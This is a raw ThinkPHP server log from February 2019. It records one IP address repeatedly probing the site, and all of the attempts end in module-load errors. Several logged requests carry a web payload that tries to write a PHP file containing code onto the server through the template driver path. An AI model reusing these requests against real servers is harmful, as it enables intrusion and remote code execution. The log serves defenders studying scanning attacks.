[ 2019-02-13T05:12:27+08:00 ] 144.202.43.188 /index.php?s=index/think/template/driver/file/write?cacheFile=yjh.php&content=%3C?php%20phpinfo();?%3E
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000018s ]
INFO: [ app_init ] --END-- [ RunTime:0.000437s ]
ERR: 无法加载模块:Index

[ 2019-02-13T05:12:29+08:00 ] 144.202.43.188 /index.php?s=captcha&test=1
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000017s ]
INFO: [ app_init ] --END-- [ RunTime:0.000461s ]
ERR: 无法加载模块:Captcha

[ 2019-02-13T05:12:32+08:00 ] 144.202.43.188 /index.php?s=index/index/index
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000013s ]
INFO: [ app_init ] --END-- [ RunTime:0.000342s ]
ERR: 无法加载模块:Index

[ 2019-02-13T22:53:47+08:00 ] 144.202.43.188 /index.php?s=index/think/template/driver/file/write?cacheFile=11.php&content=%3C?php%20phpinfo();?%3E
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000014s ]
INFO: [ app_init ] --END-- [ RunTime:0.000384s ]
ERR: 无法加载模块:Index

[ 2019-02-13T22:53:52+08:00 ] 144.202.43.188 /index.php?s=captcha&test=1
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000013s ]
INFO: [ app_init ] --END-- [ RunTime:0.000310s ]
ERR: 无法加载模块:Captcha

[ 2019-02-13T22:53:57+08:00 ] 144.202.43.188 /index.php?s=index/index/index
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000012s ]
INFO: [ app_init ] --END-- [ RunTime:0.000341s ]
ERR: 无法加载模块:Index

